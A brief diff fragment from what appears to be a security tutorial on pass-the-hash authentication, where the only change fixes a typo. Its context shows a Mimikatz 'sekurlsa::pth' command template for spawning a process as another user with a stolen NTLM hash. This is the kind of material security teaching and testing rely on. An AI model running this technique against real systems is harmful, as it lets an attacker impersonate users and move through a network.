@@ -116,7 +116,7 @@ Let's recap what we needed to authenticate as a user:
 - [x]  Timestamp
 - [x]  NTLM hash
 
-There are many ways to spawn a process as a new user, the quickiest and most common is to use Mimikatz once again. Here's the syntax:
+There are many ways to spawn a process as a new user, the quickest and most common is to use Mimikatz once again. Here's the syntax:
 
 ```
 mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<executable>
